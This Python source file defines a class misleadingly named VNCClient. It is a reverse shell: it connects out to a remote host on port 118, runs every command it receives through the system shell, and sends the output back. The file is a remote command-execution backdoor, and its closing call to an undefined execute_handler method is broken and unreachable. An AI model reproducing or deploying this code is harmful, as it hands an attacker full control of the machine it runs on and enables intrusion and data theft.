import pyautogui
import socket
from subprocess import check_output
import base64
import subprocess
import json
import time
import os
from lib.host import ipadd


class VNCClient:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))
        self.data = "Connected"
        while True:
            self.a = self.s.recv(1024)
            self.a = self.a.decode()
            if self.a != 'X':
                print("WIN")
                print(f"command = {self.a}")
                logg = check_output(self.a, shell=True)
                logg = str(logg)
                self.s.send(logg.encode())
            elif self.a == 'X':
                print(f"command = {self.a}")


myclient = VNCClient(ipadd, 118)
myclient.execute_handler()
